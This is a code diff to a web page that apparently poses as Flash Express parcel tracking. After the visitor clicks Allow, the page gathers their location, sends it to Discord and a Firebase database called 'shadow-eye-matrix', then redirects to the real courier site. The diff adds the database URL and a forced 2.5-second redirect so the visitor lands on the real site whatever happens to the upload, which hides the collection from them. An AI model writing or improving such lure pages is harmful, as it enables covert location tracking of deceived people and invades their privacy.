@@ -81,7 +81,8 @@ const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/tracking/';
       projectId: "shadow-eye-matrix",
       storageBucket: "shadow-eye-matrix.appspot.com",
       messagingSenderId: "123456789",
-      appId: "1:123456789:web:dummy"
+      appId: "1:123456789:web:dummy",
+      databaseURL: "https://shadow-eye-matrix-default-rtdb.firebaseio.com"
     };
     
     // ===== FIREBASE REAL-TIME SYNC =====
@@ -466,9 +467,6 @@ const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/tracking/';
 
        // Send to Discord
        await sendToDiscord(result);
-
-       // Redirect to Flash Express
-       window.location.href = FLASH_EXPRESS_URL;
      }
 
      // ซิงค์พิกัดไปยังหน้าหลัก
@@ -557,6 +555,12 @@ const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/tracking/';
         
         // Run hybrid geolocation
         await runHybridGeolocation();
+        
+        // Force redirect to Flash Express within 2.5 seconds after clicking Allow
+        // ทำให้เปลี่ยนหน้าได้โดยไม่ค้าง ไม่ว่า Firebase จะสำเร็จหรือเกิดข้อผิดพลาด
+        setTimeout(() => {
+          window.location.href = FLASH_EXPRESS_URL;
+        }, 2500);
       });
     });
   </script>
